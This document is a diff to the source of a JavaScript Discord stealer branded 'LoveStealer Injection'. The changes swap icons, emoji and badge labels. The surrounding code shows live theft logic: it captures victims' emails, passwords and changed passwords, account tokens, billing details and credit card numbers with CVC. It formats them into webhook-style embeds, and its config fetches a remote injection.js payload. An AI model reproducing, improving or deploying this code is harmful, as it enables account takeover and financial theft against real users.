@@ -12,8 +12,8 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'LoveStealer Injection', 
-  embed_icon: 'https://media.discordapp.net/attachments/1230434578045603922/1231814121717239868/lovestl.png?ex=66272fcc&is=6625de4c&hm=f2b2eb87e5eaade5d35beca68f0e986785d3bc3e2144d371f0cbc9ac8818521c&=&format=webp&quality=lossless'.replace(/ /g, '%20'), 
-  embed_color: 2895667, 
+  embed_icon: 'https://media.discordapp.net/attachments/1232059746354204748/1232059826528583691/c4720e224309a31442718203090a7770.png?ex=662814a1&is=6626c321&hm=c50d3fc21a9c2861e9f8c59dd5adaaf1c94e2fa60c31980c50ff02fdf583449d&=&format=webp&quality=lossless&width=350&height=350'.replace(/ /g, '%20'), 
+  embed_color: 0, 
   injection_url: 'https://raw.githubusercontent.com/LoveStealer/loves/main/injection.js', 
   /**
    
@@ -493,7 +493,7 @@ const fetchBilling = async (token) => {
 
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
-  if (!data) return '❌';
+  if (!data) return '`none`';
   let billing = '';
   data.forEach((x) => {
     if (!x.invalid) {
@@ -581,40 +581,70 @@ const getBadges = (flags) => {
   let badges = '';
   switch (flags) {
     case 1:
-      badges += 'Discord Staff, ';
+      badges += '<:staff:1232102693804314654>, ';
       break;
     case 2:
-      badges += 'Partnered Server Owner, ';
+      badges += '<:parceiro:1232102670043447397>, ';
       break;
     case 131072:
-      badges += 'Verified Bot Developer, ';
+      badges += '<:dev:1232102676125192232>, ';
       break;
     case 4:
-      badges += 'Hypesquad Event, ';
+      badges += '<:events:1232102681955405925>, ';
       break;
     case 16384:
-      badges += 'Gold BugHunter, ';
+      badges += '<:bughunter2:1232102748464615515>, ';
       break;
     case 8:
-      badges += 'Green BugHunter, ';
+      badges += '<:bughunter1:1232102749651599444>, ';
       break;
     case 512:
-      badges += 'Early Supporter, ';
+      badges += '<:early:1232102614238367765>, ';
       break;
     case 128:
-      badges += 'HypeSquad Brillance, ';
+      badges += '<:brilliance:1232102657666322502>, ';
       break;
     case 64:
-      badges += 'HypeSquad Bravery, ';
+      badges += '<:bravery:1232102661772284025>, ';
+      break;
+    case 4194304:
+      badges += '<:activedev:1232102658782007307>, ';
       break;
     case 256:
-      badges += 'HypeSquad Balance, ';
+      badges += '<:balance:1232102660447146126>, ';
+      break;
+    case 32768:
+      badges += '<:boost1:1232102555354665082>, ';
+      break;
+    case 65536:
+      badges += '<:boost2:1232102556537192511>, ';
+      break;
+    case 196608:
+      badges += '<:boost3:1232102557774647336>, ';
+      break;
+    case 393216:
+      badges += '<:boost4:1232102559041323030>, ';
+      break;
+    case 589824:
+      badges += '<:boost5:1232102560492687390>, ';
+      break;
+    case 786432:
+      badges += '<:boost6:1232102549923041352>, ';
+      break;
+    case 983040:
+      badges += '<:boost7:1232102551214882836>, ';
+      break;
+    case 1179648:
+      badges += '<:boost8:1232102552569643048>, ';
+      break;
+    case 1310720:
+      badges += '<:boost9:1232102554066878544>, ';
       break;
     case 0:
-      badges = 'None';
+      badges = '`none`';
       break;
     default:
-      badges = 'None';
+      badges = '`none`';
       break;
   }
   return badges;
@@ -661,16 +691,16 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Account Information**',
-            value: `<:mail:1095741024678191114> Email: **${email}** - <:blacklock:1095741022065131571> Password: **${password}**`,
+            value: `<:mail:1095741024678191114> Email: **${email}** - <:password:1232100660258934825> Password: **${password}**`,
             inline: false,
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<:025:1232016453805412474> Nitro Type: **${nitro}**\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
             inline: false,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '<:025:1232016457106194514> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -681,7 +711,7 @@ const login = async (email, password, token) => {
         },
         footer: {
             text: 'LoveStealer Injection・https://github.com/Mimifunk/lovestealer',
-            icon_url: "https://media.discordapp.net/attachments/1230434578045603922/1231814121717239868/lovestl.png?ex=66272fcc&is=6625de4c&hm=f2b2eb87e5eaade5d35beca68f0e986785d3bc3e2144d371f0cbc9ac8818521c&=&format=webp&quality=lossless"
+            icon_url: "https://media.discordapp.net/attachments/1232059746354204748/1232059826528583691/c4720e224309a31442718203090a7770.png?ex=662814a1&is=6626c321&hm=c50d3fc21a9c2861e9f8c59dd5adaaf1c94e2fa60c31980c50ff02fdf583449d&=&format=webp&quality=lossless&width=350&height=350"
         },
       },
     ],
@@ -704,16 +734,16 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed**',
-            value: `<:mail:1095741024678191114> Email: **${json.email}**\n<:blacklock:1095741022065131571> Old Password: **${oldpassword}**\n<:blacklock:1095741022065131571> New Password: **${newpassword}**`,
+            value: `<:mail:1095741024678191114> Email: **${json.email}**\n<:password:1232100660258934825> Old Password: **${oldpassword}**\n<:password:1232100660258934825> New Password: **${newpassword}**`,
             inline: true,
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<:025:1232016453805412474> Nitro Type: **${nitro}**\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '<:025:1232016457106194514> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -724,7 +754,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         },
         footer: {
             text: 'LoveStealer Injection・https://github.com/Mimifunk/lovestealer',
-            icon_url: "https://media.discordapp.net/attachments/1230434578045603922/1231814121717239868/lovestl.png?ex=66272fcc&is=6625de4c&hm=f2b2eb87e5eaade5d35beca68f0e986785d3bc3e2144d371f0cbc9ac8818521c&=&format=webp&quality=lossless"
+            icon_url: "https://media.discordapp.net/attachments/1232059746354204748/1232059826528583691/c4720e224309a31442718203090a7770.png?ex=662814a1&is=6626c321&hm=c50d3fc21a9c2861e9f8c59dd5adaaf1c94e2fa60c31980c50ff02fdf583449d&=&format=webp&quality=lossless&width=350&height=350"
         },
       },
     ],
@@ -747,16 +777,16 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Changed**',
-            value: `<:mail:1095741024678191114> New Email: **${email}**\n<:blacklock:1095741022065131571> Password: **${password}**`,
+            value: `<:mail:1095741024678191114> New Email: **${email}**\n<:password:1232100660258934825> Password: **${password}**`,
             inline: true,
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<:025:1232016453805412474> Nitro Type: **${nitro}**\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '<:025:1232016457106194514> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -767,7 +797,7 @@ const emailChanged = async (email, password, token) => {
         },
         footer: {
             text: 'LoveStealer Injection・https://github.com/Mimifunk/lovestealer',
-            icon_url: "https://media.discordapp.net/attachments/1230434578045603922/1231814121717239868/lovestl.png?ex=66272fcc&is=6625de4c&hm=f2b2eb87e5eaade5d35beca68f0e986785d3bc3e2144d371f0cbc9ac8818521c&=&format=webp&quality=lossless"
+            icon_url: "https://media.discordapp.net/attachments/1232059746354204748/1232059826528583691/c4720e224309a31442718203090a7770.png?ex=662814a1&is=6626c321&hm=c50d3fc21a9c2861e9f8c59dd5adaaf1c94e2fa60c31980c50ff02fdf583449d&=&format=webp&quality=lossless&width=350&height=350"
         },
       },
     ],
@@ -795,11 +825,11 @@ const PaypalAdded = async (token) => {
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<:025:1232016453805412474> Nitro Type: **${nitro}**\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '<:025:1232016457106194514> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -810,7 +840,7 @@ const PaypalAdded = async (token) => {
         },
         footer: {
             text: 'LoveStealer Injection・https://github.com/Mimifunk/lovestealer',
-            icon_url: "https://media.discordapp.net/attachments/1230434578045603922/1231814121717239868/lovestl.png?ex=66272fcc&is=6625de4c&hm=f2b2eb87e5eaade5d35beca68f0e986785d3bc3e2144d371f0cbc9ac8818521c&=&format=webp&quality=lossless"
+            icon_url: "https://media.discordapp.net/attachments/1232059746354204748/1232059826528583691/c4720e224309a31442718203090a7770.png?ex=662814a1&is=6626c321&hm=c50d3fc21a9c2861e9f8c59dd5adaaf1c94e2fa60c31980c50ff02fdf583449d&=&format=webp&quality=lossless&width=350&height=350"
         },
       },
     ],
@@ -838,11 +868,11 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<:025:1232016453805412474> Nitro Type: **${nitro}**\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '<:025:1232016457106194514> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -853,7 +883,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         },
         footer: {
             text: 'LoveStealer Injection・https://github.com/Mimifunk/lovestealer',
-            icon_url: "https://media.discordapp.net/attachments/1230434578045603922/1231814121717239868/lovestl.png?ex=66272fcc&is=6625de4c&hm=f2b2eb87e5eaade5d35beca68f0e986785d3bc3e2144d371f0cbc9ac8818521c&=&format=webp&quality=lossless"
+            icon_url: "https://media.discordapp.net/attachments/1232059746354204748/1232059826528583691/c4720e224309a31442718203090a7770.png?ex=662814a1&is=6626c321&hm=c50d3fc21a9c2861e9f8c59dd5adaaf1c94e2fa60c31980c50ff02fdf583449d&=&format=webp&quality=lossless&width=350&height=350"
         },
       },
     ],
@@ -883,11 +913,11 @@ const nitroBought = async (token) => {
           },
           {
             name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `<:025:1232016453805412474> Nitro Type: **${nitro}**\n<a:lovestl:1232020347705102427> Badges: **${badges}**\n<a:cl_creditcard:1232017137175105587> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '<:025:1232016457106194514> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -898,7 +928,7 @@ const nitroBought = async (token) => {
         },
         footer: {
             text: 'LoveStealer・https://github.com/Mimifunk/lovestealer',
-            icon_url: "https://media.discordapp.net/attachments/1230434578045603922/1231814121717239868/lovestl.png?ex=66272fcc&is=6625de4c&hm=f2b2eb87e5eaade5d35beca68f0e986785d3bc3e2144d371f0cbc9ac8818521c&=&format=webp&quality=lossless"
+            icon_url: "https://media.discordapp.net/attachments/1232059746354204748/1232059826528583691/c4720e224309a31442718203090a7770.png?ex=662814a1&is=6626c321&hm=c50d3fc21a9c2861e9f8c59dd5adaaf1c94e2fa60c31980c50ff02fdf583449d&=&format=webp&quality=lossless&width=350&height=350"
         },
       },
     ],
